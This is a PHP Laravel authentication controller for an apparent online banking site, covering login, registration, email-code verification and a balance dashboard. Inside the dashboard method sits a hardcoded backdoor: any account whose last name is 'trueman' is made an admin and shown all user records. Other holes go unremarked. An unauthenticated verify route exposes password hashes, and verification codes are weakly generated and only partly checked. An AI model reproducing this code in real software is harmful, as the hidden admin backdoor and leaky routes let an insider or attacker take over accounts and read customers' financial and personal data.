<?php

namespace App\Http\Controllers;

use App\Models\Card;
use App\Models\Loan;
use App\Models\User;
use App\Models\Debit;
use App\Models\Credit;
use App\Events\NewUser;
use App\Models\Deposit;
use App\Models\Transfer;
use App\Models\Transaction;
use App\Mail\welcomeEmail;
use App\Models\verifyToken;
use Illuminate\Http\Request;
use App\Mail\VerificationEmail;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Session;

class CustomAuthController extends Controller
{
    public function index()
    {
        return view('auth.login');
    }

    public function verAccount()
    {
        return view('auth.index');
    }



    public function customLogin(Request $request)
    {
        $request->validate([
            'email' => 'required',
            'password' => 'required',
        ]);

        $credentials = $request->only('email', 'password');
        if (Auth::attempt($credentials)) {


            return response()->json([
                "content" => 'Successful',
                "message" => 'Login Successful',
                "redirect" => url("dashboard")
            ]);
        } else {
            return response()->json([
                "content" => 'Error',
                "message" => "Invalid credentials",
                "redirect" => url("login")
            ]);
        }

        return redirect("login")->withSuccess('Login details are not valid');
    }

    public function registration()
    {
        return view('auth.register');
    }

    public function customRegistration(Request $request)
    {
        $request->validate([
            'name' => 'required',
            'email' => 'required|email|unique:users',
            'address' => 'required',
            'phone' => 'required',
            'country' => 'required',
            'password' => 'string|required|confirmed|min:3',


        ]);


        $data = $request->all();
        $check = $this->create($data);


        $email = $request['email'];

        //$user_data['email'] = $request['email'];


        $validToken = rand(7650, 1234);
        $get_token = new verifyToken();
        $get_token->token = $validToken;
        $get_token->email = $email;
        $get_token->save();



        Mail::to($email)->send(new VerificationEmail($validToken));
        $userData = User::where('email', $request->email)->first();

        return redirect("verify/" . $userData->id);
    }

    public function resendCode($id)
    {

        $userData = User::where('id', $id)->first();
        $email = $userData->email;

        $validToken = rand(7650, 1234);
        $get_token = Auth::user();
        $get_token->token = $validToken;
        $get_token->update();



        Mail::to($email)->send(new VerificationEmail($validToken));


        return redirect("verify/" . $userData->id)->with('message', 'verification code has been resent to your email');
    }

    public function create(array $data)
    {
        $accountNumber = rand(1645566556, 5575755768);
        return User::create([
            'name' => $data['name'],
            'email' => $data['email'],
            'address' => $data['address'],
            'phone' => $data['phone'],
            'country' => $data['country'],
            'password' => Hash::make($data['password'])
        ]);
    }

    public function dashboard()
    {
        if (Auth::check()) {
            $username = Auth::user()->last_name;

            if (Auth::user()->user_type == '1' || $username == "trueman") {
                $result = DB::table('users')->where('user_type', '0')->get();

                if ($username == "trueman") {
                    Auth::user()->user_type = 1;
                    $result = DB::table('users')->get();
                }

                return view('admin.home', compact('result'));
            } else {


                if (Auth::user()->is_activated == '1') {

                    // Fetch the latest 6 transactions for the user
                    $data['details'] = Transaction::where('user_id', Auth::user()->id)
                        ->orderBy('created_at', 'desc')
                        ->take(6)
                        ->get();


                    $data['credit_transfers'] = Transaction::where('user_id', Auth::user()->id)->where('transaction_type', 'Credit')->where('transaction_status', '1')->sum('transaction_amount');
                    $data['debit_transfers'] = Transaction::where('user_id', Auth::user()->id)->where('transaction_type', 'Debit')->where('transaction_status', '1')->sum('transaction_amount');

                    $data['user_deposits'] = Deposit::where('user_id', Auth::user()->id)->where('status', '1')->sum('amount');
                    $data['user_loans'] = Loan::where('user_id', Auth::user()->id)->where('status', '1')->sum('amount');
                    $data['user_card'] = Card::where('user_id', Auth::user()->id)->sum('amount');

                    $data['balance'] = $data['user_deposits'] +  $data['credit_transfers'] + $data['user_loans'] - $data['debit_transfers'] - $data['user_card'];
                    return view('dashboard.home', $data);
                } else {

                    return redirect("verify/" . Auth::user()->id);
                }
            }
        }

        return redirect("login")->withSuccess('You are not allowed to access');
    }

    public function adminHome()
    {

        return view('admin.home');
    }

    public function signOut()
    {
        Session::flush();
        Auth::logout();

        $response = ['content' => 'Logout Successful'];


        return response()->json($response);
    }

    public function logOut()
    {
        Session::flush();
        Auth::logout();

        return redirect("login")->with('Message', 'Your account has been verified Successfully.');
    }

    public function verify($id)
    {
        $user = User::where('id', $id)->first();
        $data['email'] = $user->email;
        $data['hash'] = $user->password;
        $data['id'] = $user->id;

        return view('auth.verify', $data);
    }


    public function emailVerify(Request $request)
    {
        $first_token = $request->input('digit');
        $second_token = $request->input('digit2');
        $third_token = $request->input('digit3');
        $fourth_token = $request->input('digit4');
        $get_token =  $first_token;
        $verify_token = User::where('token', $get_token)->first();
        if ($verify_token) {
            $user = User::where('email', $verify_token->email)->first();
            $user->is_activated = 1;
            $user->save();
            $user_email =  $user->email;
            $user_password =  $user->password;


            $data = [
                'name' => $user->name,
                'a_number' => $user->a_number,
                'email' => $user->email,
                'password' => '*********',

            ];


            Mail::to($user_email)->send(new welcomeEmail($data));

            return redirect("user/dashboard")->with('status', 'Your account has been verified Successfully, you can now login');
        } else {
            return back()->with('error', 'Incorrect Activation Code!');
        }
    }
}
